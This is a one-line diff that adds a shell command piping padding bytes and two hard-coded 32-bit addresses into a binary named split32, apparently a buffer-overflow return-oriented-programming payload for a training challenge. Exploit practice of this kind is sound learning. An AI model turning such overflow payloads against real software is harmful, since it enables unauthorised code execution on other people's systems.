@@ -1,0 +1,1 @@
+echo -n -e 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x1a\x86\x04\x08\x30\xa0\x04\x08' | ./split32
